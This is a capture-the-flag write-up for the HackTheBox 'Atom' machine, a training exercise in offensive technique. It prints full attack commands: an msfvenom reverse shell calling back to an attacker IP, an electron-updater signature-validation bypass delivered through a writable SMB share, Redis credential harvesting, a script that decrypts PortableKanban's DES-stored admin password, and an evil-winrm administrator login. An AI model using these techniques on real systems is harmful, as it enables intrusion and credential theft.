# HackTheBox: Atom Machine Writeup

![Cover Image](https://user-images.githubusercontent.com/87259078/125188001-2aff4700-e1e7-11eb-8d75-bcb7f46a49c5.jpg)

## [Enumeration](#enumeration-1)

## [Initial Access](#initial-access-1)

## [Privilege Escalation](#privilege-escalation-1)

----

## Synopsis

“Atom” is marked as medium difficulty machine that features Apache to host its note taking application for windows OS. The SMB port is accessible to everyone without any authentication, it has couple folders and a PDF. PDF reveals that the note taking application is built using “Electron-Builder” and SMB folders are being used as update path. We take advantage of “Signature Validation Bypass Leading to RCE In Electron-Updater” to get our initial access. Once we are in, we find that target has portable kanban and it is using redis server to store keys. We get redis server credentials vis redis configuration file and we access redis to get admin credentials. Portable Kanban stores password in encrypted format (DES), we decrypt via python code to get the password in cleartext. We login via evil-winrm as admin in target to get root flag.

## Skills Required

- SMB Enumeration
- Redis Enumeration

## Skills Learned

- Electron-Builder Exploit via signature validation bypass
- Portable Kanban Password Decryption

# Enumeration

\## Full TCP Scan

```
⛩\> nmap -sT -Pn -sV -sC -v -oA enum 10.129.137.129
Nmap scan report for atom.htb (10.129.137.129)
Host is up (0.28s latency).
Not shown: 996 filtered ports
PORT    STATE SERVICE      VERSION
80/tcp  open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
| http-methods:
|   Supported Methods: GET POST OPTIONS HEAD TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: Heed Solutions
135/tcp open  msrpc        Microsoft Windows RPC
443/tcp open  ssl/http     Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
| http-methods:
|   Supported Methods: GET POST OPTIONS HEAD TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: Heed Solutions
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2009-11-10T23:48:47
| Not valid after:  2019-11-08T23:48:47
| MD5:   a0a4 4cc9 9e84 b26f 9e63 9f9e d229 dee0
|_SHA-1: b023 8c54 7a90 5bfa 119c 4e8b acca eacf 3649 1ff6
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
445/tcp open  microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)
Service Info: Host: ATOM; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h20m02s, deviation: 4h02m31s, median: 0s
| smb-os-discovery:
|   OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: ATOM
|   NetBIOS computer name: ATOM\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-04-18T23:47:45-07:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2021-04-19T06:47:44
|_  start_date: N/A
```

Nmap reveals that target is running HTTP/s and SMB service on Windows 10 Pro OS.  Let’s do a full scan, just to be sure that we are not missing any non-popular ports.

\## Full Port scan

```
⛩\> nmap -p- -Pn -v 10.129.137.129
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-19 02:57 EDT
Initiating Connect Scan at 02:57
Nmap scan report for atom.htb (10.129.137.129)
Host is up (0.29s latency).
Not shown: 65528 filtered ports
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
443/tcp  open  https
445/tcp  open  microsoft-ds
5985/tcp open  wsman
6379/tcp open  redis
7680/tcp open  pando-pub
```

As you can see full port scan revealed Redis (6379) and Wsman (5985). Let’s perform a service scan on these new found ports.

\##Service Scan

```
⛩\> nmap -p 80,135,445,5985,6379,7680 -sC -sV -Pn -v 10.129.137.129
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-19 03:35 EDT
Host is up (0.26s latency).

PORT     STATE SERVICE      VERSION
80/tcp   open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
| http-methods:
|   Supported Methods: GET POST OPTIONS HEAD TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: Heed Solutions
135/tcp  open  msrpc        Microsoft Windows RPC
445/tcp  open  microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
6379/tcp open  redis        Redis key-value store
7680/tcp open  pando-pub?
Service Info: Host: ATOM; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h20m01s, deviation: 4h02m30s, median: 0s
| smb-os-discovery:
|   OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: ATOM
|   NetBIOS computer name: ATOM\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-04-19T00:36:46-07:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2021-04-19T07:36:47
|_  start_date: N/A
```

Let’s do SMB enumeration for any shared folders.

\##SMB Share Enumeration

```
⛩\> nmap -p445 --script smb-enum-shares 10.129.137.129
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-19 03:54 EDT
Nmap scan report for atom.htb (10.129.137.129)
Host is up (0.37s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares:
|   account_used: guest
|   \\10.129.137.129\ADMIN$:
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Remote Admin
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.129.137.129\C$:
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Default share
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.129.137.129\IPC$:
|     Type: STYPE_IPC_HIDDEN
|     Comment: Remote IPC
|     Anonymous access: <none>
|     Current user access: READ/WRITE
|   \\10.129.137.129\Software_Updates:
|     Type: STYPE_DISKTREE
|     Comment:
|     Anonymous access: <none>
|_    Current user access: READ/WRITE
```

We got one shared directory which is worth looking into. Let’s access it via SmbClient.

\##Access SMB share and download PDF

```
⛩\> smbclient //10.129.137.129/Software_Updates -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Apr 19 03:55:49 2021
  ..                                  D        0  Mon Apr 19 03:55:49 2021
  client1                             D        0  Mon Apr 19 03:53:14 2021
  client2                             D        0  Mon Apr 19 03:53:14 2021
  client3                             D        0  Mon Apr 19 03:53:14 2021
  UAT_Testing_Procedures.pdf          A    35202  Fri Apr  9 07:18:08 2021

        4413951 blocks of size 4096. 1361805 blocks available
smb: \> get UAT_Testing_Procedures.pdf
getting file \UAT_Testing_Procedures.pdf of size 35202 as UAT_Testing_Procedures.pdf (24.4 KiloBytes/sec) (average 24.4 KiloBytes/sec)
smb: \>
```

We have couple fodlers and a PDF, lrt’s download it and read.

\## App built on electron-builder

![Screen Shot 2021-04-19 at 01.21.50.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/64BCA608-2B6F-4067-A6A4-BC6C67C11917/E0E4BAB8-8FDB-4B34-8BAE-F680F462CCB9_2)

![Screen Shot 2021-04-19 at 01.22.43.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/64BCA608-2B6F-4067-A6A4-BC6C67C11917/0E707E49-6D4D-49C8-9B31-B755A920780E_2)

The note taking app is built using electron-builder, and if we drop our executables on SMB client folder then one of the engineer test that for quality analysis.

After a quick google, we get a blog describing about RCE via electron-builder updater. Read the blog to understand how this vulnerability will used in our condition.

\## Vulnerability link

[https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html](https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html)

# Initial Access

Let’s build our reverse executable via msfvenom and name it as up'date.exe

\## Create reverse shell

```
⛩\> msfvenom -p windows/x64/shell_reverse_tcp -f exe lhost=10.10.14.42 lport=1234 -o "up'date.exe"
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: up'date
```

Now we need to generate signature hash of this up’date.exe. This can be easily achieved by using a filename containing a single quote and then by recalculating the file hash to match the attacker-provided binary.

\## Create signature

```
⛩\> shasum -a 512 up\'date.exe | cut -d " " -f1 | xxd -r -p | base64
jAUiMEfUaQSD6tvtKmjG4kk9fJo/lyZBbP0/16id9lPwdyqCw5rKvbvJaCbmLE/1QMukQ8WBn/hDdL81I/UOqQ==
```

Now create a YML file and add the details of the file name, signature and version.

\## Create yml file

```
⛩\> cat latest.yml
version: 1.0.1
path: up'date.exe
sha512: jAUiMEfUaQSD6tvtKmjG4kk9fJo/lyZBbP0/16id9lPwdyqCw5rKvbvJaCbmLE/1QMukQ8WBn/hDdL81I/UOqQ==
```

\## Set netcat listener

```
⛩\> nc -lvnp 1234
listening on [any] 1234 ...
```

Now we need to upload executable and yml file to SMB client folder.

\## Upload reverse shell and yml

```
⛩\> smbclient //atom.htb/Software_updates -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Apr 20 02:52:08 2021
  ..                                  D        0  Tue Apr 20 02:52:08 2021
  client1                             D        0  Tue Apr 20 02:52:08 2021
  client2                             D        0  Tue Apr 20 02:52:08 2021
  client3                             D        0  Tue Apr 20 02:52:08 2021
  UAT_Testing_Procedures.pdf          A    35202  Fri Apr  9 07:18:08 2021

        4413951 blocks of size 4096. 1364219 blocks available
smb: \> cd client1
smb: \client1\> put up'date.exe
putting file up'date.exe as \client1\up'date.exe (8.5 kb/s) (average 8.5 kb/s)
smb: \client1\> put latest.yml
putting file latest.yml as \client1\latest.yml (0.2 kb/s) (average 4.6 kb/s)
smb: \client1\>
```

Upon upload we’d get a reverse connection on our machine.

\## Reverse Connection

```
⛩\> nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.14.42] from (UNKNOWN) [10.129.99.96] 51066
Microsoft Windows [Version 10.0.19042.906]
(c) Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>whoami
whoami
atom\jason

C:\WINDOWS\system32>
```

\## User Flag

```
PS C:\> cd users/jason/desktop
cd users/jason/desktop
PS C:\users\jason\desktop> get-childitem
get-childitem

    Directory: C:\users\jason\desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         3/31/2021   2:09 AM           2353 heedv1.lnk
-a----         3/31/2021   2:09 AM           2353 heedv2.lnk
-a----         3/31/2021   2:09 AM           2353 heedv3.lnk
-ar---         4/19/2021  11:36 PM             34 user.txt

PS C:\users\jason\desktop> Get-Content user.txt
Get-Content user.txt
de1bb61685d6f6061132bfcd2509ffc6
PS C:\users\jason\desktop>
```

# Privilege Escalation

In the current user directory, we can find portable kanban application. It is a physical board to manage your daily tasks. It is possible to create a common board and share information with colleagues, but for that they should have Redis server. As we already know from our initial enumeration that Redis is already present on target. Let’s see the configuration file of kanban.

```
PS C:\Users\jason\downloads> get-childitem
get-childitem

    Directory: C:\Users\jason\downloads

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         3/31/2021   2:36 AM                node_modules
d-----          4/2/2021   8:21 PM                PortableKanban

PS C:\Users\jason\Downloads> cd PortableKanban
cd PortableKanban

PS C:\Users\jason\Downloads\PortableKanban> get-childitem
get-childitem

    Directory: C:\Users\jason\Downloads\PortableKanban

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          4/2/2021   7:44 AM                Files
d-----          4/2/2021   7:17 AM                Plugins
-a----         2/27/2013   7:06 AM          58368 CommandLine.dll
-a----         11/8/2017  12:52 PM         141312 CsvHelper.dll
-a----         6/22/2016   9:31 PM         456704 DotNetZip.dll
-a----        11/23/2017   3:29 PM          23040 Itenso.Rtf.Converter.Html.dll
-a----        11/23/2017   3:29 PM          75776 Itenso.Rtf.Interpreter.dll
-a----        11/23/2017   3:29 PM          32768 Itenso.Rtf.Parser.dll
-a----        11/23/2017   3:29 PM          19968 Itenso.Sys.dll
-a----        11/23/2017   3:29 PM         376832 MsgReader.dll
-a----          7/3/2014  10:20 PM         133296 Ookii.Dialogs.dll
-a----          4/2/2021   8:22 PM           5920 PortableKanban.cfg
-a----          1/4/2018   8:12 PM         118184 PortableKanban.Data.dll
-a----          1/4/2018   8:12 PM        1878440 PortableKanban.exe
-a----          1/4/2018   8:12 PM          31144 PortableKanban.Extensions.dll
-a----          4/2/2021   7:21 AM            172 PortableKanban.pk3.lock
-a----          9/6/2017  12:18 PM         413184 ServiceStack.Common.dll
-a----          9/6/2017  12:17 PM         137216 ServiceStack.Interfaces.dll
-a----          9/6/2017  12:02 PM         292352 ServiceStack.Redis.dll
-a----          9/6/2017   4:38 AM         411648 ServiceStack.Text.dll
-a----          1/4/2018   8:14 PM        1050092 User Guide.pdf
```

For that we need to read the configuration file of kanban.

\## Read the config file

```
PS C:\Users\jason\Downloads\PortableKanban> get-content PortableKanban.cfg
get-content PortableKanban.cfg

{"RoamingSettings":{"DataSource":"RedisServer","DbServer":"localhost","DbPort":6379,"DbEncPassword":"Odh7N3L9aVSeHQmgK/nj7RQL8MEYCUMb",

---------SNIP-------------
```

It looks like redis is being used with kanban. Let’s access Redis configuration file for any stored credentials.

\## Read redis config file

```
PS C:\Program Files\redis> get-childitem
get-childitem

    Directory: C:\Program Files\redis

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          4/2/2021   7:31 AM                Logs
-a----          7/1/2016   3:54 PM           1024 EventLog.dll
-a----          7/1/2016   3:52 PM          12618 Redis on Windows Release Notes.docx
-a----          7/1/2016   3:52 PM          16769 Redis on Windows.docx
-a----          7/1/2016   3:55 PM         406016 redis-benchmark.exe
-a----          7/1/2016   3:55 PM        4370432 redis-benchmark.pdb
-a----          7/1/2016   3:55 PM         257024 redis-check-aof.exe
-a----          7/1/2016   3:55 PM        3518464 redis-check-aof.pdb
-a----          7/1/2016   3:55 PM         268288 redis-check-dump.exe
-a----          7/1/2016   3:55 PM        3485696 redis-check-dump.pdb
-a----          7/1/2016   3:55 PM         482304 redis-cli.exe
-a----          7/1/2016   3:55 PM        4517888 redis-cli.pdb
-a----          7/1/2016   3:55 PM        1553408 redis-server.exe
-a----          7/1/2016   3:55 PM        6909952 redis-server.pdb
-a----          4/2/2021   7:39 AM          43962 redis.windows-service.conf
-a----          4/2/2021   7:37 AM          43960 redis.windows.conf
-a----          7/1/2016   9:17 AM          14265 Windows Service Documentation.docx

PS C:\Program Files\redis> get-content redis.windows.conf
get-content redis.windows.conf
# Redis configuration file example
requirepass kidvscat_yes_kidvscat

------------SNIP--------------
```

We got the Redis credentials, let’s access Redis via our machine. FOr that we need redis-cli application. We can install it via package manager.

\## Install Redis-Tools

```
⛩\> sudo apt install redis-tools
```

Let’s authenticate via found credentials and look for any stored keys.

\## Access remote redis

```
⛩\> redis-cli -h atom.htb -a 'kidvscat_yes_kidvscat'
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
atom.htb:6379> KEYS *
1) "pk:ids:User"
2) "pk:urn:metadataclass:ffffffff-ffff-ffff-ffff-ffffffffffff"
3) "pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0"
4) "pk:ids:MetaDataClass"
atom.htb:6379> DUMP "pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0"
"\x00\xc3@\xc6@\xcf\x1f{\"Id\":\"e8e29158d70d44b1a1ba4949d\r52790a0\",\"Name )\x0cAdministrator \x16\aInitials \x1a \r\x04Email\xa0\n\x0encryptedPasswor@f\x1fOdh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi A\x02Rol\xe0\x00f \x0e\x06Inactiv \x12\x00f d\x1fe,\"TimeStamp\":637530169606440253\x00}\x06\x00\xd0uP\xdf[\x980\xb3"
atom.htb:6379>
```

We found the Administrator key but it is encrypted. We can decrypt via this python code.

\## Decrypt PK password

[Offensive Security’s Exploit Database Archive](https://www.exploit-db.com/exploits/49409)

We need to modify our code to accept our key.

\## Modify code 1

```
#!/bin/python3
import json
import base64
from des import * #python3 -m pip install des

def decode(hash):
    hash = base64.b64decode(hash.encode('utf-8'))
    key = DesKey(b"7ly6UznJ")
    return key.decrypt(hash,initial=b"XuVUm5fR",padding=True).decode('utf-8')
print(decode('Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi'))
```

\## Modify code 2

```
#!/bin/python3
import json
import base64
from des import * #python3 -m pip install des

try:
    hash = str(input("Enter the Hash : "))
    hash = base64.b64decode(hash.encode('utf-8'))
    key = DesKey(b"7ly6UznJ")
    print("Decrypted Password : " + key.decrypt(hash,initial=b"XuVUm5fR",padding=True).decode('utf-8'))
except:
    print("Wrong Hash")
```

\## Run code

```
⛩\> python3 kan1.py
kidvscat_admin_@123
```

\## Access Admin and read flag

```
⛩\> evil-winrm -i atom.htb -u administrator -p 'kidvscat_admin_@123'

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\Administrator\Documents> get-content ../desktop/root.txt
9dc8211d9cfb7397269a77cc9f3dfa24
```

